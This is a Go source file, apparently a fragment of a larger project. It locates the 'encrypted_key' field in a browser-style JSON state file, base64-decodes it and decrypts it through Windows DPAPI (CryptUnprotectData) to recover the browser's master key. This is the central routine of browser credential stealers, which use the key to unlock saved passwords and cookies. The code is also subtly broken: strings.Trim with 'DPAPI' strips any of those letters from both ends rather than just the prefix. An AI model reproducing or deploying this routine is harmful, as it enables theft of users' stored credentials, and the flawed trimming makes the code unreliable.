package main

import (
	"encoding/base64"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

func GetMasterKey(pather string) ([]byte, uint8) {

	var masterKey []byte

	jsonfile, err := os.ReadFile(pather)
	if err != nil {
		return nil, 1
	}
	sss := strings.Index(string(jsonfile), `encrypted_key`)
	if sss == -1 {
		return nil, 1
	}
	keys := ""
	for _, s := range string(jsonfile)[sss+16:] {
		keys += string(s)
	}
	roughKey := strings.Split(keys, `"`)[0]
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
	if err != nil {
		return masterKey, 1
	}
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI")

	masterKey, err = DPApi([]byte(stringKey))
	if err != nil {
		return masterKey, 1
	}

	return masterKey, 0

}

var (
	dllCrypt        = syscall.NewLazyDLL("Crypt32.dll")
	dllKernel       = syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData = dllCrypt.NewProc("CryptUnprotectData")
	procLocalFree   = dllKernel.NewProc("LocalFree")
)

func DPApi(data []byte) ([]byte, error) {
	var outBlob dataBlob
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	return outBlob.ToByteArray(), nil
}

func (b *dataBlob) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func NewBlob(d []byte) *dataBlob {
	if len(d) == 0 {
		return &dataBlob{}
	}
	return &dataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}
